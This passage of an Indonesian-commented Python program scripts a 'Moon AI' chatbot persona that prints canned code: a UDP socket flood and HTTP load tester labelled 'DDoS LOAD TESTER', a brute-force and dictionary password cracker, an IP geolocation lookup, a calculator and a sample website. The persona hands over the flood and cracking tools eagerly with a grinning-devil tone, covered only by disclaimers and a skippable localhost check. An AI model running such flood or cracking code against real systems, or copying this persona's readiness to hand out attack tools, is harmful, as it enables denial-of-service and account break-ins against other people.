            data = random._urandom(1024)  # 1KB random data
            sock.sendto(data, (target_ip, target_port))
            bytes_sent += len(data)
            
            # Tampilkan progress setiap 100 paket
            if bytes_sent % (100 * 1024) < 1024:  # Setiap ~100KB
                print(f"  Sent: {bytes_sent/1024:.0f} KB")
                
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        sock.close()
        
    print(f"\n[+] Total sent: {bytes_sent/1024:.0f} KB in {duration} seconds")
    print(f"[+] Average: {bytes_sent/duration/1024:.0f} KB/s")

# Menu utama
if __name__ == "__main__":
    
    print("\n" + "="*60)
    print("🔧 LOAD TESTING TOOL - FOR EDUCATIONAL PURPOSES ONLY")
    print("="*60)
    print("\n[!] PERINGATAN: HANYA untuk testing sistem/server ANDA SENDIRI!")
    print("[!] Dilarang keras digunakan untuk aktivitas ilegal!\n")
    
    print("Pilih mode testing:")
    print("1. HTTP Load Test")
    print("2. Socket Flood (UDP)")
    print("3. Exit")
    
    choice = input("\nPilihan (1-3): ").strip()
    
    if choice == "1":
        print("\n[*] HTTP Load Testing Mode")
        print("[!] Contoh target yang aman: http://localhost:3000")
        print("[!] JANGAN gunakan untuk website/orang lain!\n")
        
        url = input("Masukkan target URL: ").strip()
        threads = int(input("Jumlah threads (1-50): ") or "10")
        duration = int(input("Durasi (detik): ") or "30")
        
        # Validasi target
        if not url.startswith(('http://localhost', 'http://127.0.0.1', 'https://localhost')):
            confirm = input("\n[!] Target bukan localhost. Lanjutkan? (y/n): ").lower()
            if confirm != 'y':
                print("[*] Test dibatalkan")
                sys.exit(0)
        
        tester = LoadTester(url, threads, duration)
        tester.start_test()
    
    elif choice == "2":
        print("\n[*] Socket Flood Mode")
        print("[!] HANYA untuk testing server lokal!\n")
        
        ip = input("Target IP (gunakan 127.0.0.1 untuk lokal): ").strip()
        port = int(input("Target port: ") or "8080")
        duration = int(input("Durasi (detik): ") or "10")
        
        if ip not in ['127.0.0.1', 'localhost']:
            confirm = input("\n[!] Target bukan localhost. Lanjutkan? (y/n): ").lower()
            if confirm != 'y':
                print("[*] Test dibatalkan")
                sys.exit(0)
        
        socket_flood(ip, port, duration)
    
    elif choice == "3":
        print("[*] Keluar...")
        sys.exit(0)
    
    else:
        print("[-] Pilihan tidak valid!")

# ⚠️ PERINGATAN PENTING ⚠️
# =========================================
# SCRIPT INI HANYA UNTUK:
# 1. Testing load capacity SERVER ANDA SENDIRI
# 2. Tujuan edukasi dan pembelajaran
# 3. Penetration testing DENGAN IZIN
# 
# ❌ JANGAN GUNAKAN UNTUK:
# - Melakukan DDoS ke website/orang lain
# - Aktivitas ilegal apapun
# - Menyerang sistem tanpa izin
# 
# 🚨 PENGGUNAAN ILEGAL DAPAT BERAKIBAT HUKUMAN PENJARA!
# ========================================='''
        
        # Tambahkan header
        header = f"""# =========================================
# MOON AI - DDoS LOAD TESTER
# Language: Python
# Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# Price: GRATIS! 🥳
# =========================================
"""
        
        # Print dengan efek mengetik cepat
        print("\n" + "="*60)
        self._print_with_typing(header, is_code=True)
        self._print_with_typing(ddos_code, is_code=True)
        print("="*60)
        
        return ddos_code
    
    def special_calculator(self):
        """Khusus untuk Calculator Generator"""
        # Thinking animation
        self._thinking_animation()
        
        # Print response dengan variasi
        responses = [
            "Siip nih gw buatin calculator pakai Python 😈",
            "Siap bos! Ini code kalkulator Python yang mantap 🧮",
            "Oke bro, calculator Python siap pakai! ⚡",
            "Done! Calculator Python siap digunakan 🚀"
        ]
        
        print("\n🌙 Moon AI: ", end='', flush=True)
        response = random.choice(responses)
        self._print_with_typing(response, is_code=False)
        time.sleep(0.5)
        
        calculator_code = '''class Calculator:
    """Kelas kalkulator sederhana"""
    
    def __init__(self):
        self.history = []
    
    def add(self, a, b):
        """Penjumlahan"""
        result = a + b
        self.history.append(f"{a} + {b} = {result}")
        return result
    
    def subtract(self, a, b):
        """Pengurangan"""
        result = a - b
        self.history.append(f"{a} - {b} = {result}")
        return result
    
    def multiply(self, a, b):
        """Perkalian"""
        result = a * b
        self.history.append(f"{a} × {b} = {result}")
        return result
    
    def divide(self, a, b):
        """Pembagian"""
        if b == 0:
            raise ValueError("Tidak bisa membagi dengan nol!")
        result = a / b
        self.history.append(f"{a} ÷ {b} = {result}")
        return result
    
    def power(self, a, b):
        """Pangkat"""
        result = a ** b
        self.history.append(f"{a}^{b} = {result}")
        return result
    
    def square_root(self, a):
        """Akar kuadrat"""
        if a < 0:
            raise ValueError("Tidak bisa menghitung akar dari angka negatif")
        result = a ** 0.5
        self.history.append(f"√{a} = {result}")
        return result
    
    def show_history(self):
        """Menampilkan riwayat perhitungan"""
        if not self.history:
            print("Belum ada riwayat perhitungan.")
            return
        
        print("\n📜 Riwayat Perhitungan:")
        print("-" * 30)
        for i, calculation in enumerate(self.history, 1):
            print(f"{i}. {calculation}")
        print("-" * 30)

def scientific_calculator():
    """Kalkulator ilmiah dengan lebih banyak fungsi"""
    
    import math
    
    def factorial(n):
        """Faktorial"""
        if n < 0:
            return "Error: Angka negatif"
        return math.factorial(n)
    
    def sin(angle_deg):
        """Sinus dalam derajat"""
        return math.sin(math.radians(angle_deg))
    
    def cos(angle_deg):
        """Cosinus dalam derajat"""
        return math.cos(math.radians(angle_deg))
    
    def tan(angle_deg):
        """Tangen dalam derajat"""
        return math.tan(math.radians(angle_deg))
    
    def log(x, base=10):
        """Logaritma"""
        if x <= 0:
            return "Error: Angka harus positif"
        return math.log(x, base)
    
    def calculate_percentage(value, percentage):
        """Menghitung persentase"""
        return (value * percentage) / 100
    
    print("Kalkulator Ilmiah Siap!")
    return {
        "factorial": factorial,
        "sin": sin,
        "cos": cos,
        "tan": tan,
        "log": log,
        "percentage": calculate_percentage
    }

def main_menu():
    """Menu utama kalkulator"""
    calc = Calculator()
    sci_calc = scientific_calculator()
    
    print("=== KALKULATOR PYTHON ===")
    print("Pilih mode:")
    print("1. Kalkulator Dasar")
    print("2. Kalkulator Ilmiah")
    print("3. Lihat Riwayat")
    print("4. Keluar")
    
    while True:
        try:
            choice = input("\\nPilihan (1-4): ").strip()
            
            if choice == "1":
                print("\\n=== KALKULATOR DASAR ===")
                print("Operasi: +, -, ×, ÷, ^, √")
                print("Format: angka1 operator angka2")
                print("Contoh: 10 + 5")
                print("Ketik 'back' untuk kembali")
                
                while True:
                    expression = input("\\nMasukkan perhitungan: ").strip().lower()
                    
                    if expression == "back":
                        break
                    
                    try:
                        if "√" in expression:
                            # Akar kuadrat
                            num = float(expression.replace("√", "").strip())
                            result = calc.square_root(num)
                            print(f"√{num} = {result}")
                        
                        elif "^" in expression:
                            # Pangkat
                            parts = expression.split("^")
                            a = float(parts[0].strip())
                            b = float(parts[1].strip())
                            result = calc.power(a, b)
                            print(f"{a}^{b} = {result}")
                        
                        elif "+" in expression:
                            parts = expression.split("+")
                            a = float(parts[0].strip())
                            b = float(parts[1].strip())
                            result = calc.add(a, b)
                            print(f"{a} + {b} = {result}")
                        
                        elif "-" in expression:
                            parts = expression.split("-")
                            a = float(parts[0].strip())
                            b = float(parts[1].strip())
                            result = calc.subtract(a, b)
                            print(f"{a} - {b} = {result}")
                        
                        elif "×" in expression or "*" in expression:
                            expression = expression.replace("×", "*")
                            parts = expression.split("*")
                            a = float(parts[0].strip())
                            b = float(parts[1].strip())
                            result = calc.multiply(a, b)
                            print(f"{a} × {b} = {result}")
                        
                        elif "÷" in expression or "/" in expression:
                            expression = expression.replace("÷", "/")
                            parts = expression.split("/")
                            a = float(parts[0].strip())
                            b = float(parts[1].strip())
                            result = calc.divide(a, b)
                            print(f"{a} ÷ {b} = {result}")
                        
                        else:
                            print("Format tidak valid!")
                    
                    except ValueError as e:
                        print(f"Error: {e}")
                    except Exception as e:
                        print(f"Terjadi kesalahan: {e}")
            
            elif choice == "2":
                print("\\n=== KALKULATOR ILMIAH ===")
                print("Fungsi: faktorial, sin, cos, tan, log, persentase")
                print("Contoh: 'faktorial 5', 'sin 30', 'log 100 10', 'persen 200 15'")
                print("Ketik 'back' untuk kembali")
                
                while True:
                    command = input("\\nMasukkan fungsi: ").strip().lower()
                    
                    if command == "back":
                        break
                    
                    try:
                        if command.startswith("faktorial"):
                            n = int(command.split()[1])
                            result = sci_calc["factorial"](n)
                            print(f"{n}! = {result}")
                        
                        elif command.startswith("sin"):
                            angle = float(command.split()[1])
                            result = sci_calc["sin"](angle)
                            print(f"sin({angle}°) = {result:.4f}")
                        
                        elif command.startswith("cos"):
                            angle = float(command.split()[1])
                            result = sci_calc["cos"](angle)
                            print(f"cos({angle}°) = {result:.4f}")
                        
                        elif command.startswith("tan"):
                            angle = float(command.split()[1])
                            result = sci_calc["tan"](angle)
                            print(f"tan({angle}°) = {result:.4f}")
                        
                        elif command.startswith("log"):
                            parts = command.split()
                            if len(parts) == 2:
                                x = float(parts[1])
                                result = sci_calc["log"](x)
                                print(f"log({x}) = {result:.4f}")
                            elif len(parts) == 3:
                                x = float(parts[1])
                                base = float(parts[2])
                                result = sci_calc["log"](x, base)
                                print(f"log_{base}({x}) = {result:.4f}")
                            else:
                                print("Format: log [angka] [basis]")
                        
                        elif command.startswith("persen"):
                            parts = command.split()
                            if len(parts) == 3:
                                value = float(parts[1])
                                percentage = float(parts[2])
                                result = sci_calc["percentage"](value, percentage)
                                print(f"{percentage}% dari {value} = {result}")
                            else:
                                print("Format: persen [angka] [persentase]")
                        
                        else:
                            print("Fungsi tidak dikenali!")
                    
                    except (ValueError, IndexError) as e:
                        print(f"Error: Pastikan input valid! Detail: {e}")
            
            elif choice == "3":
                calc.show_history()
            
            elif choice == "4":
                print("Terima kasih telah menggunakan kalkulator! 👋")
                break
            
            else:
                print("Pilihan tidak valid!")
        
        except KeyboardInterrupt:
            print("\\n\\nProgram dihentikan.")
            break
        except Exception as e:
            print(f"Terjadi kesalahan: {e}")

if __name__ == "__main__":
    main_menu()'''
        
        # Tambahkan header
        header = f"""# =========================================
# MOON AI - CALCULATOR GENERATOR
# Language: Python
# Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# Price: GRATIS! 🥳
# =========================================
"""
        
        # Print dengan efek mengetik cepat
        print("\n" + "="*60)
        self._print_with_typing(header, is_code=True)
        self._print_with_typing(calculator_code, is_code=True)
        print("="*60)
        
        return calculator_code
    
    def special_bruteforce(self):
        """Khusus untuk Brute Force Generator"""
        # Thinking animation
        self._thinking_animation()
        
        # Print response
        print("\n🌙 Moon AI: ", end='', flush=True)
        response = "Siap boss ini code bruteforce sederhana pakai python 😈"
        self._print_with_typing(response, is_code=False)
        time.sleep(0.5)
        
        brute_code = '''import itertools
import time

def brute_force(target, charset, max_length):
    """
    Mencoba semua kombinasi karakter hingga panjang tertentu
    
    Parameters:
        target (str): Password yang ingin ditebak
        charset (str): Kumpulan karakter yang akan dicoba
        max_length (int): Panjang maksimal password
    """
    attempts = 0
    start_time = time.time()
    
    for length in range(1, max_length + 1):
        # Coba semua kombinasi dengan panjang tertentu
        for guess in itertools.product(charset, repeat=length):
            attempts += 1
            guess_str = ''.join(guess)
            
            # Tampilkan percobaan setiap 1000 kali
            if attempts % 1000 == 0:
                print(f"Percobaan ke-{attempts}: {guess_str}")
            
            # Cek apakah password cocok
            if guess_str == target:
                end_time = time.time()
                print(f"\\nPassword ditemukan: {guess_str}")
                print(f"Total percobaan: {attempts}")
                print(f"Waktu yang dibutuhkan: {end_time - start_time:.2f} detik")
                return guess_str
    
    print("Password tidak ditemukan")
    return None

def advanced_bruteforce(target, charsets, max_length):
    """
    Brute force dengan berbagai charset
    
    Parameters:
        target (str): Password yang ingin ditebak
        charsets (dict): Dictionary berisi nama charset dan karakter
        max_length (int): Panjang maksimal password
    """
    print("=== ADVANCED BRUTE FORCE ===")
    print(f"Target: {target}")
    print(f"Max length: {max_length}")
    print("-" * 40)
    
    for charset_name, charset in charsets.items():
        print(f"\\nMencoba dengan charset: {charset_name}")
        print(f"Karakter: {charset}")
        
        result = brute_force(target, charset, max_length)
        if result:
            return result
    
    print("\\nTidak berhasil menemukan password dengan charset yang tersedia")
    return None

def dictionary_attack(target, wordlist):
    """
    Mencoba password dari daftar kata
    
    Parameters:
        target (str): Password yang ingin ditebak
        wordlist (list): Daftar kata yang akan dicoba
    """
    print("=== DICTIONARY ATTACK ===")
    attempts = 0
    start_time = time.time()
    
    for word in wordlist:
        attempts += 1
        # Coba kata asli
        if word == target:
            end_time = time.time()
            print(f"\\nPassword ditemukan: {word}")
            print(f"Total percobaan: {attempts}")
            print(f"Waktu: {end_time - start_time:.2f} detik")
            return word
        
        # Coba dengan variasi
        variations = [
            word.lower(),
            word.upper(),
            word.capitalize(),
            word + "123",
            "123" + word,
            word + "!",
            word + "@",
            word + "2024",
        ]
        
        for var in variations:
            attempts += 1
            if var == target:
                end_time = time.time()
                print(f"\\nPassword ditemukan: {var}")
                print(f"Total percobaan: {attempts}")
                print(f"Waktu: {end_time - start_time:.2f} detik")
                return var
    
    print("Password tidak ditemukan dalam wordlist")
    return None

# Contoh penggunaan
if __name__ == "__main__":
    print("PILIHAN MODE BRUTE FORCE:")
    print("1. Simple Brute Force")
    print("2. Advanced Brute Force")
    print("3. Dictionary Attack")
    
    choice = input("\\nPilih mode (1/2/3): ")
    
    if choice == "1":
        # Password yang ingin ditebak
        target_password = input("Masukkan password target: ")
        
        # Set karakter yang akan dicoba
        chars = input("Masukkan charset (contoh: 0123456789): ") or "0123456789"
        
        # Panjang maksimal password
        try:
            max_len = int(input("Panjang maksimal password: ") or "4")
        except:
            max_len = 4
        
        print("\\n=== Program Brute Force Sederhana ===")
        print(f"Target password: {target_password}")
        print(f"Karakter yang digunakan: {chars}")
        print(f"Panjang maksimal: {max_len}")
        print("-" * 40)
        
        brute_force(target_password, chars, max_len)
    
    elif choice == "2":
        target_password = input("Masukkan password target: ")
        
        # Beberapa charset yang umum
        charsets = {
            "Angka": "0123456789",
            "Huruf Kecil": "abcdefghijklmnopqrstuvwxyz",
            "Huruf Besar": "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
            "Alfanumerik": "0123456789abcdefghijklmnopqrstuvwxyz",
            "Full Set": "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()"
        }
        
        try:
            max_len = int(input("Panjang maksimal password: ") or "6")
        except:
            max_len = 6
        
        advanced_bruteforce(target_password, charsets, max_len)
    
    elif choice == "3":
        target_password = input("Masukkan password target: ")
        
        # Wordlist sederhana
        common_passwords = [
            "password", "123456", "qwerty", "admin", "welcome",
            "password123", "12345678", "123456789", "12345",
            "iloveyou", "monkey", "dragon", "sunshine", "football",
            "letmein", "master", "hello", "freedom", "whatever"
        ]
        
        # Tambahkan wordlist custom
        custom_words = input("Masukkan kata-kata custom (pisahkan dengan koma): ")
        if custom_words:
            custom_list = [word.strip() for word in custom_words.split(",")]
            common_passwords.extend(custom_list)
        
        dictionary_attack(target_password, common_passwords)
    
    else:
        print("Pilihan tidak valid!")

# PERINGATAN: Hanya untuk tujuan edukasi dan testing sistem sendiri!
# Jangan gunakan untuk aktivitas ilegal!'''
        
        # Tambahkan peringatan
        warning = """\n⚠️ PERINGATAN PENTING ⚠️
=========================================
Script brute force ini hanya untuk:
1. Testing keamanan sistem ANDA SENDIRI
2. Tujuan edukasi dan pembelajaran
3. Password recovery yang LEGAL

❌ JANGAN gunakan untuk:
- Membobol akun orang lain
- Aktivitas ilegal
- Penetrasi tanpa izin

📚 GUNAKAN DENGAN BIJAK!
========================================="""
        
        # Print dengan efek mengetik cepat
        print("\n" + "="*60)
        self._print_with_typing(brute_code, is_code=True)
        self._print_with_typing(warning, is_code=False)
        print("="*60)
        
        return brute_code
    
    def special_ip_tracker(self):
        """Khusus untuk IP Tracker (sesuai permintaan)"""
        # Thinking animation
        self._thinking_animation()
        
        # Print response
        print("\n🌙 Moon AI: ", end='', flush=True)
        response = "Siap boss ini code python untuk pelacakan lewat ip nya 😈"
        self._print_with_typing(response, is_code=False)
        time.sleep(0.5)
        
        ip_code = '''import requests
import json
import socket

def get_ip_info(ip_address):
    """
    Mendapatkan informasi geografis dari alamat IP menggunakan IP-API
    """
    try:
        # Validasi format IP
        socket.inet_aton(ip_address)
        
        # URL API gratis (100 request per menit)
        url = f"http://ip-api.com/json/{ip_address}"
        response = requests.get(url, timeout=10)
        data = response.json()
        
        if data['status'] == 'success':
            print("\\n" + "="*50)
            print(f"INFORMASI UNTUK IP: {ip_address}")
            print("="*50)
            print(f"Negara      : {data.get('country', 'N/A')}")
            print(f"Kode Negara : {data.get('countryCode', 'N/A')}")
            print(f"Wilayah     : {data.get('regionName', 'N/A')}")
            print(f"Kota        : {data.get('city', 'N/A')}")
            print(f"ZIP         : {data.get('zip', 'N/A')}")
            print(f"Latitude    : {data.get('lat', 'N/A')}")
            print(f"Longitude   : {data.get('lon', 'N/A')}")
            print(f"Zona Waktu  : {data.get('timezone', 'N/A')}")
            print(f"ISP         : {data.get('isp', 'N/A')}")
            print(f"Organisasi  : {data.get('org', 'N/A')}")
            print(f"AS Number   : {data.get('as', 'N/A')}")
            print("="*50)
            
            # Tampilkan link peta (hanya perkiraan)
            if data.get('lat') and data.get('lon'):
                print(f"\\nLink Peta (perkiraan):")
                print(f"https://www.google.com/maps?q={data['lat']},{data['lon']}")
        else:
            print(f"Gagal mendapatkan informasi: {data.get('message', 'Unknown error')}")
            
    except socket.error:
        print("Error: Format IP tidak valid!")
    except requests.exceptions.RequestException as e:
        print(f"Error koneksi: {e}")
    except Exception as e:
        print(f"Error: {e}")

def get_my_ip():
    """Mendapatkan IP publik sendiri"""
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        return response.json()['ip']
    except:
        return None

def main():
    print("IP LOCATION TRACKER (INFORMASI GEOGRAFIS)")
    print("="*50)
    print("CATATAN:")
    print("1. Hanya untuk IP publik")
    print("2. Hanya informasi geografis umum")
    print("3. Tidak akurat untuk lokasi fisik tepat")
    print("4. Gunakan hanya untuk tujuan edukasi/legal\\n")
    
    # Opsi 1: Gunakan IP sendiri
    my_ip = get_my_ip()
    if my_ip:
        print(f"IP publik Anda: {my_ip}")
        use_own = input("Gunakan IP Anda? (y/n): ").lower()
        if use_own == 'y':
            get_ip_info(my_ip)
            return
    
    # Opsi 2: Masukkan IP manual
    while True:
        ip_input = input("\\nMasukkan IP address (atau 'exit' untuk keluar): ").strip()
        
        if ip_input.lower() == 'exit':
            break
            
        if ip_input:
            get_ip_info(ip_input)
        else:
            print("Silakan masukkan alamat IP yang valid.")

if __name__ == "__main__":
    # Install requests jika belum ada
    try:
        import requests
    except ImportError:
        print("Menginstal modul 'requests'...")
        import subprocess
        import sys
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
        import requests
    
    main()'''
        
        # Print dengan efek mengetik cepat
        print("\n" + "="*60)
        self._print_with_typing(ip_code, is_code=True)
        print("="*60)
        
        return ip_code
    
    def special_website(self):
        """Khusus untuk Website Generator"""
        # Thinking animation
        self._thinking_animation()
        
        # Print response
        print("\n🌙 Moon AI: ", end='', flush=True)
        response = "Siap bro! Ini code website responsive yang keren 🚀"
        self._print_with_typing(response, is_code=False)
        time.sleep(0.5)
        
        website_code = '''<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Website Keren - Moon AI Generated</title>
    <style>
        /* Reset CSS */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        /* Variabel CSS */
        :root {
            --primary: #6c63ff;
            --secondary: #ff6584;
            --dark: #2a2a3c;
            --light: #f8f9fa;
            --success: #4CAF50;
        }
        
        body {
            background-color: var(--light);
            color: var(--dark);
            line-height: 1.6;
        }
        
        /* Header & Navigation */
        header {
            background: linear-gradient(135deg, var(--dark), var(--primary));
            color: white;
            padding: 1rem 0;
            position: sticky;
            top: 0;
            z-index: 1000;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }
        
        nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 20px;
        }
        
        .logo {
            font-size: 1.8rem;
            font-weight: bold;
            color: white;
            text-decoration: none;
        }
        
        .logo span {
            color: var(--secondary);
        }
        
        .nav-links {
            display: flex;
            list-style: none;
            gap: 2rem;
        }
        
        .nav-links a {
            color: white;
            text-decoration: none;
            font-weight: 500;
            transition: color 0.3s;
        }
        
        .nav-links a:hover {
            color: var(--secondary);
        }
        
        /* Hero Section */
        .hero {
            padding: 5rem 0;
            text-align: center;
            background: linear-gradient(rgba(255,255,255,0.9), rgba(255,255,255,0.9)), 
                        url('https://images.unsplash.com/photo-1517697471339-4aa32003c11a?w=1200');
            background-size: cover;
        }
        
        .hero h1 {
            font-size: 3.5rem;
            margin-bottom: 1rem;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .hero p {
            font-size: 1.2rem;
            max-width: 800px;
            margin: 0 auto 2rem;
            color: #666;
        }
        
        .cta-button {
            display: inline-block;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            padding: 1rem 2rem;
            border-radius: 50px;
            text-decoration: none;
            font-weight: bold;
            font-size: 1.1rem;
            transition: transform 0.3s, box-shadow 0.3s;
            box-shadow: 0 4px 15px rgba(108, 99, 255, 0.3);
        }
        
        .cta-button:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(108, 99, 255, 0.4);
        }
        
        /* Features Section */
        .features {
            padding: 5rem 0;
            background-color: white;
        }
        
        .section-title {
            text-align: center;
            margin-bottom: 3rem;
        }
        
        .section-title h2 {
            font-size: 2.5rem;
            color: var(--dark);
            margin-bottom: 1rem;
        }
        
        .section-title p {
            color: #666;
            max-width: 600px;
            margin: 0 auto;
        }
        
        .features-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 2rem;
            margin-top: 3rem;
        }
        
        .feature-card {
            background: white;
            padding: 2rem;
            border-radius: 15px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.08);
            transition: transform 0.3s;
            text-align: center;
        }
        
        .feature-card:hover {
            transform: translateY(-10px);
        }
        
        .feature-icon {
            font-size: 3rem;
            margin-bottom: 1.5rem;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .feature-card h3 {
            font-size: 1.5rem;
            margin-bottom: 1rem;
            color: var(--dark);
        }
        
        /* About Section */
        .about {
            padding: 5rem 0;
            background: linear-gradient(135deg, #f8f9fa, #e9ecef);
        }
        
        .about-content {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 4rem;
            align-items: center;
        }
        
        .about-text h2 {
            font-size: 2.5rem;
            margin-bottom: 1.5rem;
            color: var(--dark);
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 2rem;
            margin-top: 3rem;
        }
        
        .stat-item {
            text-align: center;
        }
        
        .stat-number {
            font-size: 2.5rem;
            font-weight: bold;
            color: var(--primary);
            margin-bottom: 0.5rem;
        }
        
        /* Contact Section */
        .contact {
            padding: 5rem 0;
            background-color: white;
        }
        
        .contact-form {
            max-width: 600px;
            margin: 0 auto;
            padding: 2rem;
            background: white;
            border-radius: 15px;
            box-shadow: 0 5px 25px rgba(0,0,0,0.1);
        }
        
        .form-group {
            margin-bottom: 1.5rem;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 500;
            color: var(--dark);
        }
        
        .form-control {
            width: 100%;
            padding: 1rem;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 1rem;
            transition: border-color 0.3s;
        }
        
        .form-control:focus {
            outline: none;
            border-color: var(--primary);
        }
        
        textarea.form-control {
            min-height: 150px;
            resize: vertical;
        }
        
        .submit-btn {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            border: none;
            padding: 1rem 2rem;
            border-radius: 8px;
            font-size: 1.1rem;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            transition: transform 0.3s;
        }
        
        .submit-btn:hover {
            transform: translateY(-2px);
        }
        
        /* Footer */
        footer {
            background: var(--dark);
            color: white;
            padding: 3rem 0 1rem;
        }
        
        .footer-content {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 3rem;
            margin-bottom: 2rem;
        }
        
        .footer-section h3 {
            font-size: 1.5rem;
            margin-bottom: 1.5rem;
            color: var(--secondary);
        }
        
        .social-links {
            display: flex;
            gap: 1rem;
            margin-top: 1rem;
        }
        
        .social-links a {
            color: white;
            font-size: 1.5rem;
            transition: color 0.3s;
        }
        
        .social-links a:hover {
            color: var(--secondary);
        }
        
        .footer-bottom {
            text-align: center;
            padding-top: 2rem;
            border-top: 1px solid rgba(255,255,255,0.1);
            color: rgba(255,255,255,0.7);
        }
        
        /* Responsive Design */
        @media (max-width: 768px) {
            .nav-links {
                display: none;
            }
            
            .hero h1 {
                font-size: 2.5rem;
            }
            
            .section-title h2 {
                font-size: 2rem;
            }
            
            .stats {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <!-- Header & Navigation -->
    <header>
        <nav class="container">
            <a href="#" class="logo">Moon<span>AI</span></a>
            <ul class="nav-links">
                <li><a href="#home">Home</a></li>
                <li><a href="#features">Fitur</a></li>
                <li><a href="#about">Tentang</a></li>
                <li><a href="#contact">Kontak</a></li>
            </ul>
        </nav>
    </header>
    
    <!-- Hero Section -->
    <section id="home" class="hero">
        <div class="container">
            <h1>Website Keren Generator</h1>
            <p>Dibuat dengan ❤️ oleh Moon AI. Website modern, responsive, dan siap pakai. 
               Gratis untuk semua project kamu!</p>
            <a href="#features" class="cta-button">Jelajahi Fitur</a>
        </div>
    </section>
    
    <!-- Features Section -->
    <section id="features" class="features">
        <div class="container">
            <div class="section-title">
                <h2>Fitur Unggulan</h2>
                <p>Temukan semua kelebihan website ini yang dibuat oleh AI canggih</p>
            </div>
            
            <div class="features-grid">
                <div class="feature-card">
                    <div class="feature-icon">🚀</div>
                    <h3>Cepat & Responsif</h3>
                    <p>Website dengan performa optimal di semua perangkat, dari desktop hingga mobile.</p>
                </div>
                
                <div class="feature-card">
                    <div class="feature-icon">🎨</div>
                    <h3>Design Modern</h3>
                    <p>Interface yang elegant dengan warna yang menarik dan layout yang user-friendly.</p>
                </div>
                
                <div class="feature-card">
                    <div class="feature-icon">⚡</div>
                    <h3>SEO Friendly</h3>
                    <p>Struktur kode yang optimal untuk mesin pencari, siap untuk ranking tinggi.</p>
                </div>
            </div>
        </div>
    </section>
    
    <!-- About Section -->
    <section id="about" class="about">
        <div class="container">
            <div class="about-content">
                <div class="about-text">
                    <h2>Tentang Moon AI</h2>
                    <p>Moon AI adalah Artificial Intelligence yang khusus dibuat untuk membantu developer 
                       dalam membuat code dengan cepat dan mudah. Dengan teknologi terbaru, kami bisa 
                       menghasilkan code yang clean, efficient, dan siap pakai.</p>
                    <p>Website ini adalah contoh hasil kerja Moon AI yang dibuat dalam hitungan detik!</p>
                    
                    <div class="stats">
                        <div class="stat-item">
                            <div class="stat-number">1000+</div>
                            <div class="stat-label">Code Generated</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-number">5</div>
                            <div class="stat-label">Languages</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-number">0</div>
                            <div class="stat-label">Biaya</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    
    <!-- Contact Section -->
    <section id="contact" class="contact">
        <div class="container">
            <div class="section-title">
                <h2>Hubungi Kami</h2>
                <p>Ada pertanyaan atau ingin request code? Silakan hubungi kami!</p>
            </div>
            
            <form class="contact-form">
                <div class="form-group">
                    <label for="name">Nama Lengkap</label>
                    <input type="text" id="name" class="form-control" placeholder="Masukkan nama anda">
                </div>
                
                <div class="form-group">
                    <label for="email">Email</label>
                    <input type="email" id="email" class="form-control" placeholder="email@contoh.com">
                </div>
                
                <div class="form-group">
                    <label for="message">Pesan</label>
                    <textarea id="message" class="form-control" placeholder="Tulis pesan anda..."></textarea>
                </div>
                
                <button type="submit" class="submit-btn">Kirim Pesan</button>
            </form>
        </div>
    </section>
    
    <!-- Footer -->
    <footer>
        <div class="container">
            <div class="footer-content">
                <div class="footer-section">
                    <h3>Moon AI</h3>
                    <p>AI Pembuat Code Terbaik. Bikin code apa aja, kapan aja, GRATIS!</p>
                </div>
                
                <div class="footer-section">
                    <h3>Link Cepat</h3>
                    <ul>
                        <li><a href="#home">Home</a></li>
                        <li><a href="#features">Fitur</a></li>
                        <li><a href="#about">Tentang</a></li>
                        <li><a href="#contact">Kontak</a></li>
                    </ul>
                </div>
                
                <div class="footer-section">
                    <h3>Follow Kami</h3>
                    <div class="social-links">
                        <a href="#">📘</a>
                        <a href="#">🐦</a>
                        <a href="#">📸</a>
                        <a href="#">📺</a>
                    </div>
                </div>
            </div>
            
            <div class="footer-bottom">
                <p>&copy; 2024 Moon AI Generator. Dibuat dengan ❤️. Semua code GRATIS! 🥳</p>
            </div>
        </div>
    </footer>
    
    <!-- JavaScript untuk interaksi -->
    <script>
        // Smooth scrolling untuk anchor links
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function(e) {
                e.preventDefault();
                
                const targetId = this.getAttribute('href');
                if(targetId === '#') return;
                
                const targetElement = document.querySelector(targetId);
                if(targetElement) {
                    window.scrollTo({
